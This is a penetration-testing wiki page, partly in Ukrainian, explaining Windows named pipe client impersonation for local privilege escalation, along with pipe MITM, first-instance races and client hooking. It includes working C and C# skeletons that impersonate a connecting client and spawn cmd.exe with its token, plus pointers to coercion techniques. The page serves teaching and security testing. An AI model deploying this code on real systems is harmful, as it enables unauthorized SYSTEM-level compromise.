# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation — це local privilege escalation primitive, яка дозволяє thread сервера named-pipe прийняти security context клієнта, що підключається до нього. На практиці attacker, який може запускати code з SeImpersonatePrivilege, може змусити привілейованого клієнта (наприклад, службу SYSTEM) підключитися до pipe, контрольованого attacker’ом, викликати ImpersonateNamedPipeClient, дублювати отриманий token у primary token і запустити process від імені клієнта (часто NT AUTHORITY\SYSTEM).

Ця сторінка зосереджена на базовій техніці. Для end-to-end exploit chains, які змушують SYSTEM підключитися до вашого pipe, дивіться сторінки родини Potato, згадані нижче.

## TL;DR
- Створіть named pipe: \\.\pipe\<random> і дочекайтеся connection.
- Змусьте привілейований компонент підключитися до нього (spooler/DCOM/EFSRPC/etc.).
- Прочитайте щонайменше одне message з pipe, потім викличте ImpersonateNamedPipeClient.
- Відкрийте impersonation token з поточного thread, DuplicateTokenEx(TokenPrimary) і CreateProcessWithTokenW/CreateProcessAsUser, щоб отримати SYSTEM process.

## Requirements and key APIs
- Privileges, які зазвичай потрібні calling process/thread:
- SeImpersonatePrivilege, щоб успішно impersonate connecting client і використовувати CreateProcessWithTokenW.
- Або, після impersonate SYSTEM, можна використати CreateProcessAsUser, що може вимагати SeAssignPrimaryTokenPrivilege і SeIncreaseQuotaPrivilege (ці привілеї задовольняються, коли ви impersonate SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (потрібно прочитати щонайменше одне message перед impersonation)
- ImpersonateNamedPipeClient і RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW або CreateProcessAsUser
- Impersonation level: щоб виконувати корисні local дії, client має дозволяти SecurityImpersonation (типово для багатьох local RPC/named-pipe clients). Clients можуть знизити це через SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION під час відкриття pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Ці techniques змушують privileged services підключатися до your named pipe, щоб ви могли їх impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

When a privileged service and a low-privileged process communicate over `\\.\pipe\...`, treat the pipe like any other untrusted IPC boundary. Beyond classic server-side impersonation, weak pipe ACLs, unsafe creation flags, and client-side trust decisions can all become local privilege escalation primitives.

### Enumerate candidate pipes first
- List pipes quickly from PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` is useful to spot instance counts and single-instance pipes.
- Prioritize names used by services running as `SYSTEM`, especially helpers, updaters, launchers, and UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Any process that can talk to a privileged server can already fuzz its protocol and hunt privileged verbs.
- The more interesting case is when the DACL grants `FILE_GENERIC_WRITE`/`GENERIC_WRITE` on the pipe object. On named pipes this implicitly includes `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` shares the same bit), so an attacker can create another server instance with the same name.
- Because instances are matched in FIFO order, attacker-created and legitimate instances can be interleaved: create a rogue instance with `CreateNamedPipe`, then open the same pipe name with `CreateFile`, and wait for a real client to land on the rogue server instance.
- Result: observe, modify, relay, or desynchronize privileged IPC without needing to own the original server process.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` only defines the DACL when the first instance of a pipe name is created.
- If a privileged service starts late and does not use `FILE_FLAG_FIRST_PIPE_INSTANCE`, an attacker can pre-create the pipe name with a permissive DACL, then let the service create later instances under the attacker-chosen security context.
- This turns service startup into a race condition: win the first instance, then connect or MITM later clients using the weakened ACL.
- Mitigation for defenders, and a key review point for attackers: check whether `CreateNamedPipe(..., dwOpenMode, ...)` includes `FILE_FLAG_FIRST_PIPE_INSTANCE`. If not, test pre-creation before the service starts.

### PID/signature checks are hardening, not a boundary
- Some products try to restrict access by checking `GetNamedPipeClientProcessId`, process image path, or Authenticode signer of the connecting client.
- This only helps until you inject into the legitimate client: once inside the trusted process, you inherit the exact PID/image/signature context the server expects.
- For split desktop apps, instrumenting the low-privileged UI/helper process is often easier than attacking the `SYSTEM` service directly.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile` before the syscall consumes the buffer, and inspect/patch `NtReadFile` after it returns.
- Overlapped I/O: store the `OVERLAPPED`/`IoStatusBlock` seen in `NtReadFile`, then inspect the buffer after `GetOverlappedResult` or the relevant wait completes.
- Completion ports: `GetQueuedCompletionStatus` reaches `NtRemoveIoCompletion`; the returned `ApcContext` links back to the `OVERLAPPED` used by the original read, which is the right pivot to find the now-populated buffer.
- Completion routines (`ReadFileEx`): the completion callback is delivered as an APC. If you want to tamper with returned data or inject synthetic replies, hook the real completion routine and, for custom injection, use a one-argument `QueueUserAPC` dispatcher that reconstructs the routine's 3 expected arguments.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxies named-pipe traffic through an injected helper DLL and exposes a Burp-like workflow for editing/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) takes a Frida-based approach and focuses on hooking `NtReadFile`/`NtWriteFile` plus the async/completion pivots above, then forwarding traffic to a WebSocket-backed editing workflow.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Named pipes є low-latency; довгі паузи під час редагування buffers можуть deadlock brittle services.
- Overlapped/completion-port/APC-driven clients потребують інших hooks, ніж прості `ReadFile`/`WriteFile` detours.
- Injection у trusted client є noisy і зазвичай краще підходить для exploit development, protocol reversing або local lab fuzzing.

## Troubleshooting and gotchas
- Ви повинні прочитати щонайменше одне message з pipe перед викликом ImpersonateNamedPipeClient; інакше ви отримаєте ERROR_CANNOT_IMPERSONATE (1368).
- Якщо client підключається з SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server не може fully impersonate; перевірте impersonation level token’а через GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW вимагає SeImpersonatePrivilege у caller. Якщо це завершується з ERROR_PRIVILEGE_NOT_HELD (1314), використайте CreateProcessAsUser після того, як ви вже impersonated SYSTEM.
- Переконайтеся, що security descriptor вашого pipe дозволяє target service підключитися, якщо ви його harden; за замовчуванням, pipes під \\.\pipe доступні відповідно до DACL server’а.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
